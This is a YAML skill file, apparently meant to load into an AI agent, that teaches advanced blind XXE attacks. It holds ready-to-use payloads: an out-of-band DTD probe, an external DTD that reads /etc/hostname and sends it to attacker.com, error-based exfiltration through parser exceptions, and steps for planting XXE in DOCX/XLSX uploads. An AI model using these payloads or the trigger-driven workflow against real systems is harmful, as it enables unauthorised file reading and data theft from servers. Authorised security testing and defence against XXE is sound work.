schema_version: 1
version: 3.0.0
name: xxe-advanced
description: >
  Blind Out-of-Band (OAST) XML External Entity (XXE) assessment, external DTD hosting, error-based
  data exfiltration, and office document / SVG pipeline XML injection (DOCX/XLSX/PDF).
triggers:
  - blind xxe
  - oob xxe
  - parameter entity
  - external dtd
  - docx xxe
  - error-based xxe
  - xlsx xxe
  - blind xml
tools:
  - curl
  - python3
knowledge: |
  Blind XXE targets XML parsers that process external entities but do not reflect the entity contents
  in the HTTP response. Exploitation requires Parameter Entities, external DTD staging, or error-based exfiltration.

  1. BLIND OAST CONFIRMATION (OUT-OF-BAND DNS ORACLE):
     Before constructing complex file exfiltration chains, confirm the parser resolves external DTDs:
     - Inject parameter entity requesting an OAST listener (e.g. interactsh):
       `<?xml version="1.0" encoding="UTF-8"?>`
       `<!DOCTYPE root [<!ENTITY % oob SYSTEM "http://UNIQUE.interactsh-domain.com/canary.dtd">%oob;]>`
       `<root><test>1</test></root>`
     - If HTTP GET or DNS request arrives on interactsh, external entity resolution is confirmed active!

  2. EXTERNAL DTD DATA EXFILTRATION:
     When outbound network egress is allowed:
     a. Host malicious DTD on attacker-controlled server (`eval.dtd`):
        `<!ENTITY % file SYSTEM "file:///etc/hostname">`
        `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">`
        `%eval;`
        `%exfil;`
     b. Trigger external DTD from victim request:
        `<!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/eval.dtd">%dtd;]>`
        `<root>test</root>`

  3. ERROR-BASED XXE (EGRESS FILTERING BYPASS):
     When outbound network access is blocked by firewall:
     Trigger a parser error that reflects the target file content inside the error message:
     Host local DTD payload invoking a non-existent file path containing the file entity:
       `<!ENTITY % file SYSTEM "file:///etc/hostname">`
       `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">`
       `%eval;`
       `%error;`
     The parser attempts to load `/nonexistent/<hostname>` and throws a FileNotFound exception
     revealing `<hostname>` in the HTTP 500 error response!

  4. OFFICE DOCUMENT & SVG EXTRACTION PIPELINE (DOCX / XLSX):
     When the application accepts Microsoft Office documents or SVG graphics:
     - Unpack `.docx` or `.xlsx` (they are PKZIP archives):
       unzip document.docx -d docx_extracted/
     - Inject XXE payload into `[Content_Types].xml` or `word/document.xml`:
       `<!DOCTYPE x [<!ENTITY % ext SYSTEM "http://attacker.com/canary">%ext;]>`
     - Repack the archive:
       zip -r exploit.docx *
     - Upload document; backend document conversion / indexing services parse the XML.

  5. SITUATION HANDLING:
     - Character set corruption: If file contains special XML characters (`<`, `&`), raw file inclusion
       breaks parser syntax. Wrap in CDATA sections or use PHP base64 filter where applicable.
     - Never test entity expansion payloads that cause resource exhaustion (Billion Laughs).
